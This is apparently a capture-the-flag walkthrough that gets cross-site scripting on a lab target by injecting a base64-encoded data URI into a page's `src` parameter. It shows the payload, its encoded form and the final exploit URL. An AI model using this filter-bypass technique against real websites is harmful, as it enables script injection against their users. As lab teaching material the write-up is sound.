## Step 1: Open the Website

Open the target application in your browser:

```
http://<target-ip>
```

Click on the **NSA image**.

---

## Step 2: Identify the Vulnerable Parameter

Observe that the page loads media using a `src` parameter:

```
http://<target-ip>/?page=media&src=...
```

This suggests user-controlled input is used inside an HTML context.

---

## Step 3: Test Basic XSS

Attempt to inject a simple script:

```html
<script>alert(1)</script>
```

If direct injection is filtered, try bypassing using encoding techniques.

---

## Step 4: Use Base64 + Data URI

Encode the payload in Base64.

Original payload:

```html
<script>alert(1)</script>
```

Base64 encoded:

```
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Construct a **data URI**:

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Final exploit URL:

```
http://<target-ip>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Step 5: Execute & Get the Flag

When the page loads:

* The browser decodes the Base64 data
* Interprets it as HTML
* Executes the injected script

The flag is then displayed.
